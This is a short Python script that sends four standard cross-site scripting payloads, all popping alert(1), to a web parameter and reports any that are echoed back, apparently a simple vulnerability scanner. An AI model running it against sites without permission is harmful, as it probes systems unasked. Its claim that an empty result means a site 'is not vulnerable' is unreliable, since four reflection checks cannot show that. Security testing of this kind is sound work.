import requests
from bs4 import BeautifulSoup

def test_xss(url, param,method='GET'):
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>"
    ]
    results = []

    session = requests.Session()
    
    for payload in payloads:
        try:
            if method.upper() == 'GET':
                r = session.get(url, params={param: payload})
            elif method.upper() == 'POST':
                r = session.post(url, data={param: payload})
            else:
                print("Unsupported method. Use 'GET' or 'POST'.")
                return []

            print(f"Testing payload: {payload}")
            print(f"URL: {r.url}")
            print(f"Response status code: {r.status_code}")
            print(f"Response body: {r.text[:500]}")

            if payload in r.text:
                results.append(f"Potential XSS with payload: {payload}")
        
        except requests.RequestException as e:
            print(f"Request failed: {e}")

    if len(results) == 0:
        return ["The website is not vulnerable to XSS attack"]
    else:
        return results




